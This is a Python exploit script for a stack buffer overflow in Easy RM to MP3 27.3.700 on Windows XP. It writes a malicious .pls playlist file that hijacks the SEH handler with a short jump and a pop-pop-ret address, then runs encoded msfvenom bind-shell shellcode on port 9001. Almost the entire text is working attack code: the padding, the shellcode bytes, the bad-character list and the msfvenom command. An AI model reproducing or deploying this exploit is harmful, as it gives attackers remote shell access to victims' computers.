# Exploit for Easy RM to MP3 27.3.700 - Stack Buffer Overflow
# Author: Pal1Sec
# Tested on Windows XP Professional SP 3
#!/usr/bin/python
file = open("exploit.pls", "wb")

# badchars = "\x00\x09\x0a"
# pop pop ret = "0x1002d619"
# conditional jmp = "\xeb\x06\x90\x90"
# msfvenom -p windows/shell_bind_tcp LPORT=9001 -a x86 EXITFUNC=thread -e x86/shikata_ga_nai -b "\x00\x09\x0a" -f c

bind = ("\xbe\x2b\x81\x1e\xc1\xd9\xc4\xd9\x74\x24\xf4\x5f\x29\xc9\xb1"
"\x53\x83\xc7\x04\x31\x77\x0e\x03\x5c\x8f\xfc\x34\x5e\x67\x82"
"\xb7\x9e\x78\xe3\x3e\x7b\x49\x23\x24\x08\xfa\x93\x2e\x5c\xf7"
"\x58\x62\x74\x8c\x2d\xab\x7b\x25\x9b\x8d\xb2\xb6\xb0\xee\xd5"
"\x34\xcb\x22\x35\x04\x04\x37\x34\x41\x79\xba\x64\x1a\xf5\x69"
"\x98\x2f\x43\xb2\x13\x63\x45\xb2\xc0\x34\x64\x93\x57\x4e\x3f"
"\x33\x56\x83\x4b\x7a\x40\xc0\x76\x34\xfb\x32\x0c\xc7\x2d\x0b"
"\xed\x64\x10\xa3\x1c\x74\x55\x04\xff\x03\xaf\x76\x82\x13\x74"
"\x04\x58\x91\x6e\xae\x2b\x01\x4a\x4e\xff\xd4\x19\x5c\xb4\x93"
"\x45\x41\x4b\x77\xfe\x7d\xc0\x76\xd0\xf7\x92\x5c\xf4\x5c\x40"
"\xfc\xad\x38\x27\x01\xad\xe2\x98\xa7\xa6\x0f\xcc\xd5\xe5\x47"
"\x21\xd4\x15\x98\x2d\x6f\x66\xaa\xf2\xdb\xe0\x86\x7b\xc2\xf7"
"\xe9\x51\xb2\x67\x14\x5a\xc3\xae\xd3\x0e\x93\xd8\xf2\x2e\x78"
"\x18\xfa\xfa\x15\x10\x5d\x55\x08\xdd\x1d\x05\x8c\x4d\xf6\x4f"
"\x03\xb2\xe6\x6f\xc9\xdb\x8f\x8d\xf2\xc0\x66\x1b\x14\x6c\x69"
"\x4d\x8e\x18\x4b\xaa\x07\xbf\xb4\x98\x3f\x57\xfc\xca\xf8\x58"
"\xfd\xd8\xae\xce\x76\x0f\x6b\xef\x88\x1a\xdb\x78\x1e\xd0\x8a"
"\xcb\xbe\xe5\x86\xbb\x23\x77\x4d\x3b\x2d\x64\xda\x6c\x7a\x5a"
"\x13\xf8\x96\xc5\x8d\x1e\x6b\x93\xf6\x9a\xb0\x60\xf8\x23\x34"
"\xdc\xde\x33\x80\xdd\x5a\x67\x5c\x88\x34\xd1\x1a\x62\xf7\x8b"
"\xf4\xd9\x51\x5b\x80\x11\x62\x1d\x8d\x7f\x14\xc1\x3c\xd6\x61"
"\xfe\xf1\xbe\x65\x87\xef\x5e\x89\x52\xb4\x7f\x68\x76\xc1\x17"
"\x35\x13\x68\x7a\xc6\xce\xaf\x83\x45\xfa\x4f\x70\x55\x8f\x4a"
"\x3c\xd1\x7c\x27\x2d\xb4\x82\x94\x4e\x9d")

nops = 20*"\x90"

buffer = "A"*45196 + "\xeb\x06\x90\x90\x19\xd6\x02\x10" + nops + bind + nops + "C"*(50000-8-45196-len(bind)-len(2*nops))

file.write(buffer)
file.close()
